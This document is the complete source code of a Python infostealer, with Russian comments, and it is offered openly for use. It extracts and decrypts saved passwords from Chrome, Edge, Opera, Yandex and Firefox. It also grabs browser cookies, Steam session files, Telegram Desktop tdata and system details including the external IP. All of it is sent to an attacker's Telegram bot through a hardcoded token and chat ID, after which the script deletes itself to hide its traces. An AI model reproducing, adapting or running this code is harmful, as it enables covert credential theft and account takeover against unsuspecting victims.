#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import shutil
import zipfile
import requests
import platform
import getpass
import glob
import time
import subprocess
import json
import sqlite3
import base64
from pathlib import Path
import browser_cookie3
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import win32crypt
import psutil

BOT_TOKEN = '8619383925:AAH6Xn8MS6rczrd-mg8B-WmQ8eHLIUCxIKY'
ADMIN_ID = '8520741161'

# ================== УТИЛИТЫ ==================
def send_telegram(file_path=None, text=None):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/'
    if text:
        try:
            data = {'chat_id': ADMIN_ID, 'text': text[:4096]}
            requests.post(url + 'sendMessage', data=data, timeout=10)
        except:
            pass
    if file_path and os.path.exists(file_path):
        try:
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': ADMIN_ID}
                requests.post(url + 'sendDocument', data=data, files=files, timeout=60)
        except:
            pass

def self_destruct():
    script_path = os.path.abspath(sys.argv[0])
    try:
        os.remove(script_path)
    except:
        pass

    if platform.system() == 'Windows':
        vbs_content = f"""
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "cmd /c timeout /t 2 /nobreak > nul & del /f /q ""{script_path}""", 0, False
"""
        vbs_path = os.path.join(os.environ['TEMP'], 'cleanup.vbs')
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        subprocess.Popen(['wscript.exe', vbs_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        if os.fork() == 0:
            time.sleep(2)
            try:
                os.remove(script_path)
            except:
                pass
            os._exit(0)

# ================== БРАУЗЕРЫ (ПАРОЛИ И КУКИ) ==================
def get_browser_paths(browser):
    home = str(Path.home())
    paths = {
        'chrome': {
            'login_db': os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'cookie_db': os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
            'local_state': os.path.join(home, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        },
        'edge': {
            'login_db': os.path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
            'cookie_db': os.path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
            'local_state': os.path.join(home, 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Local State')
        },
        'firefox': {
            'profile_path': os.path.join(home, 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        },
        'opera': {
            'login_db': os.path.join(home, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Login Data'),
            'cookie_db': os.path.join(home, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Cookies'),
            'local_state': os.path.join(home, 'AppData', 'Roaming', 'Opera Software', 'Opera Stable', 'Local State')
        },
        'yandex': {
            'login_db': os.path.join(home, 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Login Data'),
            'cookie_db': os.path.join(home, 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies'),
            'local_state': os.path.join(home, 'AppData', 'Local', 'Yandex', 'YandexBrowser', 'User Data', 'Local State')
        }
    }
    return paths.get(browser)

def decrypt_chrome_password(encrypted_value, master_key):
    try:
        nonce = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        auth_tag = encrypted_value[-16:]

        cipher = Cipher(algorithms.AES(master_key), modes.GCM(nonce, auth_tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return decrypted.decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8')
        except:
            return None

def steal_browser_passwords():
    results = []
    browsers = ['chrome', 'edge', 'opera', 'yandex']

    for browser in browsers:
        paths = get_browser_paths(browser)
        if not paths or not os.path.exists(paths['login_db']):
            continue

        master_key = None
        if 'local_state' in paths and os.path.exists(paths['local_state']):
            try:
                with open(paths['local_state'], 'r', encoding='utf-8') as f:
                    local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
                encrypted_key = encrypted_key[5:]
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            except:
                pass

        temp_db = f"{browser}_passwords_temp.db"
        try:
            shutil.copy2(paths['login_db'], temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, enc_pass = row
                if username and enc_pass:
                    password = decrypt_chrome_password(enc_pass, master_key) if master_key else None
                    if password:
                        results.append(f"[{browser}] {url} | {username} : {password}")
            conn.close()
            os.remove(temp_db)
        except:
            pass

    ff_paths = get_browser_paths('firefox')
    if ff_paths and os.path.exists(ff_paths['profile_path']):
        for profile in os.listdir(ff_paths['profile_path']):
            logins_path = os.path.join(ff_paths['profile_path'], profile, 'logins.json')
            if os.path.exists(logins_path):
                try:
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    for login in data.get('logins', []):
                        url = login.get('hostname')
                        username = login.get('username')
                        password = login.get('password')
                        if url and username and password:
                            results.append(f"[firefox] {url} | {username} : {password}")
                except:
                    pass
    return results

def steal_cookies():
    cookie_files = []
    temp_dir = f"cookies_{int(time.time())}"
    os.makedirs(temp_dir, exist_ok=True)

    try:
        for c in browser_cookie3.chrome():
            with open(os.path.join(temp_dir, 'chrome_cookies.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{c.domain}\t{c.name}\t{c.value}\n")
        cookie_files.append(os.path.join(temp_dir, 'chrome_cookies.txt'))
    except:
        pass

    try:
        for c in browser_cookie3.firefox():
            with open(os.path.join(temp_dir, 'firefox_cookies.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{c.domain}\t{c.name}\t{c.value}\n")
        cookie_files.append(os.path.join(temp_dir, 'firefox_cookies.txt'))
    except:
        pass

    try:
        for c in browser_cookie3.edge():
            with open(os.path.join(temp_dir, 'edge_cookies.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{c.domain}\t{c.name}\t{c.value}\n")
        cookie_files.append(os.path.join(temp_dir, 'edge_cookies.txt'))
    except:
        pass

    try:
        for c in browser_cookie3.opera():
            with open(os.path.join(temp_dir, 'opera_cookies.txt'), 'a', encoding='utf-8') as f:
                f.write(f"{c.domain}\t{c.name}\t{c.value}\n")
        cookie_files.append(os.path.join(temp_dir, 'opera_cookies.txt'))
    except:
        pass

    if cookie_files:
        zip_name = f"cookies_{platform.node()}_{int(time.time())}.zip"
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file in cookie_files:
                if os.path.exists(file) and os.path.getsize(file) > 0:
                    zf.write(file, os.path.basename(file))
        shutil.rmtree(temp_dir)
        return zip_name
    shutil.rmtree(temp_dir)
    return None

# ================== STEAM ==================
def steal_steam():
    steam_paths = []
    home = str(Path.home())

    if platform.system() == 'Windows':
        steam_paths.append(os.path.join(os.getenv('ProgramFiles(x86)'), 'Steam', 'config', 'config.vdf'))
        steam_paths.append(os.path.join(os.getenv('ProgramFiles(x86)'), 'Steam', 'ssfn'))
        steam_paths.append(os.path.join(home, 'AppData', 'Local', 'Steam', 'htmlcache', 'Cookies'))
    elif platform.system() == 'Linux':
        steam_paths.append(os.path.join(home, '.steam', 'steam', 'config', 'config.vdf'))
        steam_paths.append(os.path.join(home, '.steam', 'steam', 'ssfn'))
    elif platform.system() == 'Darwin':
        steam_paths.append(os.path.join(home, 'Library', 'Application Support', 'Steam', 'config', 'config.vdf'))
        steam_paths.append(os.path.join(home, 'Library', 'Application Support', 'Steam', 'ssfn'))

    temp_dir = f"steam_{int(time.time())}"
    os.makedirs(temp_dir, exist_ok=True)
    found = False

    for path in steam_paths:
        if os.path.isfile(path):
            shutil.copy2(path, os.path.join(temp_dir, os.path.basename(path)))
            found = True
        elif os.path.isdir(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    if file.startswith('ssfn'):
                        full_path = os.path.join(root, file)
                        shutil.copy2(full_path, os.path.join(temp_dir, file))
                        found = True

    if found:
        zip_name = f"steam_{platform.node()}_{int(time.time())}.zip"
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    zf.write(os.path.join(root, file), file)
        shutil.rmtree(temp_dir)
        return zip_name

    shutil.rmtree(temp_dir)
    return None

# ================== TELEGRAM (TDATA) ==================
def find_tdata():
    home = str(Path.home())
    paths = []

    system = platform.system()
    if system == 'Windows':
        appdata = os.getenv('APPDATA')
        if appdata:
            paths.append(os.path.join(appdata, 'Telegram Desktop', 'tdata'))
        paths.append(os.path.join(os.path.dirname(sys.executable), 'tdata'))
    elif system == 'Linux':
        paths.append(os.path.join(home, '.local', 'share', 'TelegramDesktop', 'tdata'))
        paths.append(os.path.join(home, '.var', 'app', 'org.telegram.desktop', 'data', 'TelegramDesktop', 'tdata'))
    elif system == 'Darwin':
        paths.append(os.path.join(home, 'Library', 'Application Support', 'Telegram Desktop', 'tdata'))

    for path in paths:
        if os.path.isdir(path):
            return path
    return None

def archive_tdata(tdata_path):
    zip_name = f"tdata_{platform.node()}_{int(time.time())}.zip"
    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    if file.endswith('.lock') or file == 'lockfile':
                        continue
                    abs_path = os.path.join(root, file)
                    rel_path = os.path.relpath(abs_path, os.path.dirname(tdata_path))
                    zf.write(abs_path, rel_path)
        return zip_name
    except:
        return None

# ================== СИСТЕМНАЯ ИНФА ==================
def get_system_info():
    info = []
    info.append(f"Хост: {platform.node()}")
    info.append(f"ОС: {platform.system()} {platform.release()}")
    info.append(f"Пользователь: {getpass.getuser()}")
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"Внешний IP: {ip}")
    except:
        info.append("Внешний IP: неизвестен")
    info.append(f"CPU: {psutil.cpu_count(logical=True)} ядер")
    mem = psutil.virtual_memory()
    info.append(f"RAM: {mem.total // (1024**3)} GB всего, {mem.percent}% занято")
    return "\n".join(info)

# ================== ГЛАВНАЯ ФУНКЦИЯ ==================
def main():
    try:
        send_telegram(text=f"✅ Инфект на {platform.node()} ({getpass.getuser()})")

        sys_info = get_system_info()
        send_telegram(text=f"📊 Система:\n{sys_info}")

        passwords = steal_browser_passwords()
        if passwords:
            pass_file = f"passwords_{int(time.time())}.txt"
            with open(pass_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(passwords))
            send_telegram(file_path=pass_file, text="🔑 Найденные пароли")
            os.remove(pass_file)
        else:
            send_telegram(text="❌ Пароли не найдены")

        cookies_zip = steal_cookies()
        if cookies_zip:
            send_telegram(file_path=cookies_zip, text="🍪 Кукисы браузеров")
            os.remove(cookies_zip)

        steam_zip = steal_steam()
        if steam_zip:
            send_telegram(file_path=steam_zip, text="🎮 Steam сессии")
            os.remove(steam_zip)

        tdata_path = find_tdata()
        if tdata_path:
            tdata_zip = archive_tdata(tdata_path)
            if tdata_zip:
                send_telegram(file_path=tdata_zip, text="✈️ Telegram tdata")
                os.remove(tdata_zip)

        send_telegram(text="💀 Сбор завершён. Скрипт самоликвидируется")
        self_destruct()

    except Exception as e:
        send_telegram(text=f"❌ Ошибка: {str(e)}")
        self_destruct()

if __name__ == '__main__':
    main()
